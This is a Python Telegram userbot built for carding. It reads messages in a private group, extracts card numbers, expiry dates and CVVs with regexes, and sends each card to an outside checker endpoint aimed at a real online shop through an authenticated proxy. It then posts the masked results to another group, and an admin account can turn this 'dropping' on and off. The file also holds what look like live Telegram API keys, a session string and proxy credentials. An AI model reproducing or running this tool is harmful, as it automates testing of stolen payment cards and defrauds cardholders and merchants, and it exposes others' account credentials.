# fast_dedup_card_bot.py
import re
import aiohttp
import asyncio
import random
import logging
import time
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from typing import Optional, Set, Dict

# ---------------- CONFIG ----------------
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("droper")

# Replace with your details
api_id = 17455551
api_hash = "abde39d2fad230528b2695a14102e76a"
SESSION_STRING = "1BVtsOLwBu6ENhB2xUwqQMeRb6FQoytffPpwMLt-CwrOa3uq6NQlpb3nN4nIByzoDeWalXRhiZaiRbdCqCOHWG3mfsFZcw_YijQUdLK7rdS-5AXRsY5oQdKACOoiHgtslVac2_wNCL6MA_UUhU5orRzaV7kkBtimv6XY6y-9yab4SlrUsxafzOjhqfhDRfX-stkrHgp9_wwOMYheTnUbzMkRsQnjAFLsd-AuuVkXdTPI1HoPzDzRVma_7ysD8K4fNaO2VWYoQQ0yM3-jcRGpGELYARrTz6AvVLSaosypQPGX_B-ukh1CJc_2hVKxz3FgxCiP6md1rMlzQujNB6ejl20L0_2P-yf4="

PRIVATE_GROUP_ID = -1002682944548   # listen for cards here
TARGET_GROUP_ID = -1002968335063    # forward results here
ADMIN_ID = 8493360284

API_URL = "https://autosh.arpitchk.shop/puto.php"
SITE = "https://jasonwubeauty.com"
PROXIES = ["45.41.172.51:5794:juftilus:atasaxde44jl"]

NUM_CONCURRENT = 5
GLOBAL_DEDUPE_SECONDS = 60 * 30  # 30 minutes dedupe

# ---------------- CLIENT & STATE ----------------
client = TelegramClient(StringSession(SESSION_STRING), api_id, api_hash)
session: Optional[aiohttp.ClientSession] = None
semaphore = asyncio.Semaphore(NUM_CONCURRENT)

_in_progress: Set[str] = set()
_recent_processed: Dict[str, float] = {}
_target_entity = None
dropping_enabled = True  # enabled by default

# ---------------- REGEX ----------------
SIMPLE_CARD_REGEX = re.compile(
    r"(?P<cc>\d{13,19})[^\d]{0,8}?(?P<mm>\d{2})[^\d]{0,4}?(?P<yy>\d{2,4})[^\d]{0,6}?(?P<cvv>\d{3,4})"
)
GROUPED_REGEX = re.compile(
    r"(?P<cc>(?:\d{4}[\s\-\.\|/]){3}\d{4})\D{0,6}(?P<mm>\d{2})[\/\-\|]?(?P<yy>\d{2,4})\D{0,6}(?P<cvv>\d{3,4})"
)
FALLBACK_REGEX = re.compile(
    r"(?P<t1>\d{12,19})\D{1,6}(?P<t2>\d{2})\D{1,6}(?P<t3>\d{2,4})\D{1,6}(?P<t4>\d{3,4})"
)
PATTERNS = (SIMPLE_CARD_REGEX, GROUPED_REGEX, FALLBACK_REGEX)
_SEP_CLEAN = re.compile(r"[\s\-\.\|/]")

def normalize_cc(cc_raw: str) -> str:
    return re.sub(r"\D", "", _SEP_CLEAN.sub("", str(cc_raw)))

def normalize_year(yy: str) -> str:
    return yy[-2:] if len(yy.strip()) == 4 else yy.zfill(2)

def build_token(cc: str, mm: str, yy: str, cvv: str) -> Optional[str]:
    cc_n = normalize_cc(cc)
    if not (13 <= len(cc_n) <= 19):
        return None
    try:
        mm_i = int(mm)
        if not (1 <= mm_i <= 12):
            return None
    except:
        return None
    yy_n, cvv_n = normalize_year(yy), re.sub(r"\D", "", cvv)
    return f"{cc_n}|{mm_i:02d}|{yy_n}|{cvv_n}"

# ---------------- API ----------------
async def call_api(card_token: str, retries: int = 2, timeout: int = 12) -> dict:
    proxy_choice = random.choice(PROXIES) if PROXIES else ""
    params = {"site": SITE, "cc": card_token, "proxy": proxy_choice}
    backoff = 1.0
    for attempt in range(retries + 1):
        try:
            async with session.get(API_URL, params=params, timeout=timeout) as resp:
                text = await resp.text()
                try:
                    return await resp.json()
                except:
                    return {"Response": text.strip()}
        except Exception as e:
            if attempt < retries:
                await asyncio.sleep(backoff); backoff *= 2
            else:
                return {"Response": f"API Error: {e}"}
    return {"Response": "Unknown error"}

# ---------------- PROCESS ----------------
async def process_card(card_token: str):
    now = time.time()
    if _recent_processed.get(card_token, 0) + GLOBAL_DEDUPE_SECONDS > now:
        return
    if card_token in _in_progress:
        return

    _in_progress.add(card_token)
    try:
        async with semaphore:
            result = await call_api(card_token)
            response = result.get("Response", "No response")
            _recent_processed[card_token] = time.time()

            cc = card_token.split("|")[0]
            masked = f"{cc[:-4]}****{cc[-4:]}" if len(cc) > 8 else cc
            stylish = f"💳 <code>{masked}</code>\n🟢 {response}"

            if dropping_enabled:
                try:
                    await client.send_message(_target_entity or TARGET_GROUP_ID, stylish, parse_mode="html")
                except Exception as e:
                    logger.warning("Send failed: %s", e)
    finally:
        _in_progress.discard(card_token)

# ---------------- CLEANUP ----------------
async def _cleanup_recent_task():
    while True:
        await asyncio.sleep(60)
        cutoff = time.time() - GLOBAL_DEDUPE_SECONDS
        for k, t in list(_recent_processed.items()):
            if t < cutoff:
                _recent_processed.pop(k, None)

# ---------------- HANDLERS ----------------
@client.on(events.NewMessage(chats=PRIVATE_GROUP_ID))
async def on_new_msg(event):
    text = event.raw_text or ""
    for pat in PATTERNS:
        m = pat.search(text)
        if not m:
            continue
        gd = m.groupdict()
        if gd:
            cc, mm, yy, cvv = gd.get("cc") or gd.get("t1"), gd.get("mm") or gd.get("t2"), gd.get("yy") or gd.get("t3"), gd.get("cvv") or gd.get("t4")
        else:
            continue
        token = build_token(cc, mm, yy, cvv)
        if token and token not in _recent_processed and token not in _in_progress:
            asyncio.create_task(process_card(token))
        break  # only 1 card per message

@client.on(events.NewMessage(from_users=ADMIN_ID))
async def admin_handler(event):
    global dropping_enabled
    txt = (event.raw_text or "").strip().lower()
    if txt == "/start":
        await event.reply("✅ Bot is running and listening for cards.")
    elif txt == "/drop":
        dropping_enabled = True; await event.reply("✅ Dropping enabled.")
    elif txt == "/stop":
        dropping_enabled = False; await event.reply("⏹ Dropping disabled.")
    elif txt == "/status":
        await event.reply(f"📊 Status:\nDropping: {dropping_enabled}\nRecent tokens: {len(_recent_processed)}")

# ---------------- MAIN ----------------
async def main():
    global session, _target_entity
    session = aiohttp.ClientSession()
    await client.start()

    try:
        _target_entity = await client.get_entity(TARGET_GROUP_ID)
        logger.info("Resolved target group.")
    except Exception as e:
        logger.warning("Could not resolve target entity: %s", e)
        _target_entity = None

    asyncio.create_task(_cleanup_recent_task())
    logger.info("Listening in group %s", PRIVATE_GROUP_ID)
    await client.run_until_disconnected()
    await session.close()

if __name__ == "__main__":
    asyncio.run(main())
